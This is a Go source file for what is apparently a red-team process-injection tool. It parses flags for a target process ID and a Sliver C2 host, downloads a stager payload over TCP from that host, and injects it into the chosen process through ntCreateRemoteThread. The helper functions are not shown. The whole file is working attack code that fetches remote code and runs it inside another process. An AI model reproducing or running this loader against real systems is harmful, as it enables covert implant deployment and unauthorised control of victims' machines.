package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"time"

	arg "github.com/alexflint/go-arg"
)

var args struct {
	ListInjectableProcesses bool   `arg:"-l,--list-injectable-processes" help:"list injectable processes"`
	ProcessPID              int    `arg:"-p,--pid" help:"the process ID to inject payload into" default:"0"`
	SliverHost              string `arg:"-s,--sliver-host" help:"the sliver IP:PORT hosting the stager to execute"`
}

func main() {
	arg.MustParse(&args)

	if args.ListInjectableProcesses {
		findInjectableProcesses()
		return
	}

	if args.ProcessPID != 0 {
		if args.SliverHost == "" {
			fmt.Println("must specify sliver IP:PORT hosting stager, `--sliver-host`")
			return
		} else {
			dialer := net.Dialer{
				Timeout: time.Second * 3,
			}
			conn, err := dialer.Dial("tcp", args.SliverHost)
			if err != nil {
				fmt.Println(err.Error())
				return
			}
			defer conn.Close()
			payload, _ := ioutil.ReadAll(conn)
			ntCreateRemoteThread(args.ProcessPID, payload)
		}
	} else {
		fmt.Println("must specify a valid PID with `--pid`")
	}
}
